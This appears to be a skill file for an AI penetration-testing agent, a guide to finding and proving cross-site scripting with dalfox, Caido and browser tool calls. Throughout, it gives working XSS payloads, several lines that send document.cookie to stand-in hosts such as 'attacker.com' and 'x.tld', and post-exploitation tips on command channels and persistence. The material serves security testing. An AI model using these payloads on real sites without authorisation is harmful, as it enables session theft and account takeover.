<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: xss
description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
---

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` with strings
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

## Polyglot Payloads

Keep a compact set tuned per context:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content

### Svelte

- Sinks: `{@html}` and dynamic attributes

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved

## False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports

## Concrete Testing Workflow (Step-by-Step Commands)

This is the mandatory execution sequence. Do NOT skip steps. Do NOT run scanners before manual reflection check.

### PHASE A — Candidate Discovery (from enumerated URLs)

  STEP A1: Extract XSS candidates using gf patterns from collected URLs:
    cat output/urls_all_deduped.txt | gf xss | sort -u > output/xss_candidates.txt
    cat output/historical_urls.txt | gf xss | sort -u >> output/xss_candidates.txt
    wc -l output/xss_candidates.txt
    # If 0 candidates: check if URL collection ran — katana/waybackurls/gau must run first.

  STEP A2: For each candidate URL, manually confirm reflection before scanning:
    # Replace VALUE with the actual param value in the URL
    curl -sk "http://target.com/search?q=CANARY_XSS_TEST_12345" | grep -i "CANARY_XSS_TEST_12345"
    # If grep returns output: parameter reflects. Proceed to PHASE B.
    # If no output: not reflected — skip this parameter.

### PHASE B — Automated XSS Scanning (only after reflection confirmed)

  STEP B1: Run dalfox through Caido on the candidate list:
    cat output/xss_candidates.txt | dalfox pipe \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_results.txt 2>&1
    # Full dalfox guide: read dalfox.md

  STEP B2: For authenticated endpoints (requires session cookie):
    dalfox url "http://target.com/profile?name=test" \
      --cookie "session=$(cat output/session_cookie.txt)" \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_auth.txt

  STEP B3: Check Caido history for payloads that got interesting responses:
    curl -sL -X POST http://127.0.0.1:48080/graphql \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d '{"query":"{ requests(filter: {host: {eq: \"TARGET_HOST\"}, resp: {code: {lt: 500}}}) { edges { node { id method path response { statusCode length } } } } }"}'

### PHASE C — DOM XSS Analysis (for JS-heavy apps)

  STEP C1: Identify JavaScript sources from page source:
    browser_action(action="goto", url="http://target.com/page")
    browser_action(action="view_source", tab_id="main")
    # Search for: location.hash, URLSearchParams, document.referrer → innerHTML/eval flows

  STEP C2: Trace data flow with sink instrumentation:
    browser_action(action="execute_js", js_code="""
      ['innerHTML','outerHTML'].forEach(prop => {
        const desc = Object.getOwnPropertyDescriptor(Element.prototype, prop);
        if (!desc) return;
        Object.defineProperty(Element.prototype, prop, {
          set: function(v) { if(v && /<[a-z]/i.test(v)) console.warn('[SINK '+prop+']', v.substring(0,150)); return desc.set.call(this,v); }
        });
      });
    """, tab_id="main")
    browser_action(action="goto", url="http://target.com/page#<img src=x onerror=alert(1)>")
    browser_action(action="get_console_logs", tab_id="main")
    # [SINK innerHTML] in console = confirmed DOM XSS path

  STEP C3: Run dalfox DOM-focused scan on discovered endpoint:
    dalfox url "http://target.com/page?ref=test" \
      --skip-bav \
      --only-discovery \
      --proxy http://127.0.0.1:48080

### PHASE D — Manual Verification and PoC (for every dalfox [V] VULN result)

  STEP D1: Reproduce in headless browser:
    browser_action(action="goto", url="<exact VULN URL from dalfox>")
    browser_action(action="get_console_logs", tab_id="main")
    # Confirm execution — look for alert or console output

  STEP D2: Classify the context (determines what encoding was bypassed):
    browser_action(action="view_source", tab_id="main")
    # Is payload in: HTML node, attribute value, JS string, URL handler, event attribute?
    # Context determines what encoding defence was missing.

  STEP D3: Craft impact-demonstrating PoC (not just alert(1)):
    # Session hijack:
    <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
    # Demonstrate: did the cookie actually exfiltrate? Use interactsh-client as receiver:
    interactsh-client -n 1 -o output/interactsh_xss.txt &
    # Replace attacker.com with your interactsh URL

  STEP D4: Only call create_vulnerability_report after:
    - Browser confirms execution (not just reflection)
    - Impact PoC demonstrated (cookie/token exfiltrated OR significant action taken)
    - Exact URL, parameter, payload, context, and impact documented

### Context-Specific Payload Selection

  HTML node context (input appears between tags):
    <svg onload=alert(1)>
    <img src=x onerror=alert(1)>

  HTML attribute context (input appears inside an attribute value):
    Quoted:   " onmouseover=alert(1) x="
    Unquoted: onmouseover=alert(1)

  JavaScript string context (input appears inside a JS variable):
    "-alert(1)-"
    ';alert(1)//

  URL/href context:
    javascript:alert(1)

  Check with Caido: intercept the request and inspect which context the payload lands in.

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.
